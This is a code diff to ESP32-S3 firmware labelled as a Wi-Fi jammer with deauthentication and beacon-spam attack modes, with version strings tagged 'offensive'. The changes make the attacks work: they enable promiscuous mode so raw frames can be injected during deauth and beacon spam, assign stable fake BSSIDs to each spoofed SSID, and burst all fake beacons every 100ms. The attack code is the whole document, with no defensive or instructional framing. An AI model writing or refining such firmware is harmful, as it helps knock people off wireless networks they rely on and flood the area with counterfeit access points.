@@ -1,6 +1,6 @@
 /**
  * ESP32-S3 Wi-Fi Analyzer + Dual Mode Noise Jammer + Deauth/Beacon Attack
- * Version: 1.5.0 - Wideband + Single Channel + Deauth + Beacon Spam
+ * Version: 1.5.1 - Fix raw frame injection (promiscuous mode) + stable beacon MACs
  */
 
 #include <Arduino.h>
@@ -40,6 +40,8 @@ uint8_t beaconCount     = 10;
 uint8_t beaconChannel   = 6;
 uint8_t beaconIndex     = 0;
 uint32_t lastBeaconTime = 0;
+#define MAX_BEACON_COUNT 50
+uint8_t beaconMACs[MAX_BEACON_COUNT][6]; // stable MACs per fake SSID
 
 // ================================================================
 //                     HELPERS
@@ -126,6 +128,7 @@ void startDeauth(const String& bssid, uint8_t ch, int count) {
   esp_wifi_set_mode(WIFI_MODE_AP);
   esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
   esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous(true); // required for raw frame injection on ESP32-S3
 
   Serial.printf("{\"type\":\"status\",\"status\":\"deauth_on\",\"bssid\":\"%s\",\"channel\":%d,\"count\":%d}\n",
                 bssid.c_str(), deauthChannel, count);
@@ -134,6 +137,7 @@ void startDeauth(const String& bssid, uint8_t ch, int count) {
 void stopDeauth() {
   if (!deauthMode) return;
   deauthMode = false;
+  esp_wifi_set_promiscuous(false);
   WiFi.mode(WIFI_STA);
   esp_wifi_set_mode(WIFI_MODE_STA);
   Serial.printf("{\"type\":\"status\",\"status\":\"deauth_off\",\"sent\":%d}\n", deauthSent);
@@ -164,15 +168,24 @@ void sendDeauthFrame() {
 
 void startBeaconSpam(const String& prefix, uint8_t count, uint8_t ch) {
   beaconSSIDPrefix = prefix;
-  beaconCount      = count < 1 ? 1 : (count > 50 ? 50 : count);
+  beaconCount      = count < 1 ? 1 : (count > MAX_BEACON_COUNT ? MAX_BEACON_COUNT : count);
   beaconChannel    = constrain(ch, 1, 13);
   beaconIndex      = 0;
   beaconMode       = true;
+
+  // Generate one stable MAC per fake SSID — clients need consistent BSSIDs
+  for (int i = 0; i < beaconCount; i++) {
+    uint32_t r1 = esp_random(), r2 = esp_random();
+    memcpy(beaconMACs[i], &r1, 4);
+    memcpy(beaconMACs[i] + 4, &r2, 2);
+    beaconMACs[i][0] = (beaconMACs[i][0] & 0xFE) | 0x02; // locally administered, unicast
+  }
 
   WiFi.mode(WIFI_AP);
   esp_wifi_set_mode(WIFI_MODE_AP);
   esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
   esp_wifi_set_channel(beaconChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous(true); // required for raw frame injection on ESP32-S3
 
   Serial.printf("{\"type\":\"status\",\"status\":\"beacon_on\",\"prefix\":\"%s\",\"count\":%d,\"channel\":%d}\n",
                 prefix.c_str(), beaconCount, beaconChannel);
@@ -181,6 +194,7 @@ void startBeaconSpam(const String& prefix, uint8_t count, uint8_t ch) {
 void stopBeaconSpam() {
   if (!beaconMode) return;
   beaconMode = false;
+  esp_wifi_set_promiscuous(false);
   WiFi.mode(WIFI_STA);
   esp_wifi_set_mode(WIFI_MODE_STA);
   Serial.println("{\"type\":\"status\",\"status\":\"beacon_off\"}");
@@ -192,12 +206,8 @@ void sendBeaconFrame() {
   ssid += String(beaconIndex);
   uint8_t ssidLen = ssid.length() > 32 ? 32 : (uint8_t)ssid.length();
 
-  // Random source MAC / BSSID for this beacon
-  uint8_t mac[6];
-  uint32_t r1 = esp_random(), r2 = esp_random();
-  memcpy(mac, &r1, 4);
-  memcpy(mac + 4, &r2, 2);
-  mac[0] = (mac[0] & 0xFE) | 0x02; // Locally administered, unicast
+  // Use the stable pre-generated MAC for this SSID index
+  uint8_t* mac = beaconMACs[beaconIndex];
 
   uint8_t frame[128];
   uint8_t pos = 0;
@@ -237,6 +247,7 @@ void sendBeaconFrame() {
 
   beaconIndex = (beaconIndex + 1) % beaconCount;
 }
+
 
 // ================================================================
 //                     SCAN + COMMAND CODE (unchanged but included)
@@ -384,7 +395,7 @@ void handleCommand(String cmd) {
   }
   else if (c == "BEACON_STOP") stopBeaconSpam();
   else if (c == "INFO") {
-    Serial.printf("{\"type\":\"info\",\"fw\":\"1.5.0-offensive\",\"chip\":\"ESP32-S3\",\"heap\":%d}\n", ESP.getFreeHeap());
+    Serial.printf("{\"type\":\"info\",\"fw\":\"1.5.1-offensive\",\"chip\":\"ESP32-S3\",\"heap\":%d}\n", ESP.getFreeHeap());
   }
 }
 
@@ -397,7 +408,7 @@ void setup() {
   delay(800);
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
-  Serial.println("{\"type\":\"ready\",\"fw\":\"1.5.0-offensive\",\"chip\":\"ESP32-S3\"}");
+  Serial.println("{\"type\":\"ready\",\"fw\":\"1.5.1-offensive\",\"chip\":\"ESP32-S3\"}");
 }
 
 void loop() {
@@ -432,9 +443,13 @@ void loop() {
 
   if (beaconMode) {
     uint32_t now = millis();
-    if (now - lastBeaconTime >= 100) {  // 10 beacons/sec cycling through fake SSIDs
+    if (now - lastBeaconTime >= 100) {  // burst all SSIDs every 100ms so each gets ~10 beacons/sec
       lastBeaconTime = now;
-      sendBeaconFrame();
+      for (uint8_t i = 0; i < beaconCount; i++) {
+        beaconIndex = i;
+        sendBeaconFrame();
+      }
+      beaconIndex = 0;
     }
   }
 
